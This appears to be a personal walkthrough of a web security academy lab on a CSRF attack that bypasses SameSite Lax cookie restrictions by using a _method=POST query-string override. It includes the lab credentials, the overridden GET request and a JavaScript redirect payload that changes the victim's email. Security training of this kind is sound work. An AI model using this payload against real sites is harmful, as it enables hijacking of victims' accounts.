# SameSite Lax bypass via method override
- lab's change email function is vulnerable to CSRF
- credentials: wiener:peter
# Goal
- perform a CSRF attack that changes the victim's email address
# solving The Lab
- log in and change email
- for CSRF To be possibel
  - Certain Action : change email
  - cookie based session handeling : session cookie
  - no unpredictablle request parameters : yes
- he website doesn't explicitly specify any SameSite restrictions when setting session cookies.
- As a result, the browser will use the default Lax restriction level.
- this means the session cookie will be sent in cross-site GET requests, as long as they involve a top-level navigation
- Bypass the SameSite restrictions
  - In Burp Repeater, right-click on the request and select Change request method
  - Send the request. Observe that the endpoint only allows POST requests
  - overriding the method by adding the _method parameter to the query string
  ```
  GET /my-account/change-email?email=foo%40web-security-academy.net&_method=POST HTTP/1.1
  ```
  - this seems to have been accepted by the server
  - confirm that your email address has changed.
- Craft an exploit
  - go to the exploit server.
  - this must cause a top-level navigation in order for the session cookie to be included
  ```
  <script>
    document.location = "https://0af8006e04f3292381706bfc00a00015.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
  </script>
  ```
  - and we solved the lab
